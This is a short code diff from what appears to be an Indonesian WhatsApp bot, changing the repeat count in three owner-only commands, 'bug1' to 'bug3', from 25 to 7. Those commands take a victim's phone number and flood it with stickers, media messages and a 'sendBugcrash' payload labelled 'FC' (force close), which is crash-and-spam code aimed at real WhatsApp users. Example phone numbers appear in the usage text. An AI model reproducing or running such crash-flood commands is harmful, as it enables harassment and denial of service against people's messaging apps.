@@ -492,7 +492,7 @@ case 'bug3':{
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '7'
 waktu = '5s'
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
@@ -505,7 +505,7 @@ case 'bug2': {
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '7'
 waktu = '5s'
 for (let i = 0; i < jumlah; i++) {
 sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
@@ -518,7 +518,7 @@ case 'bug1': {
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '7'
 waktu = '5s'
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
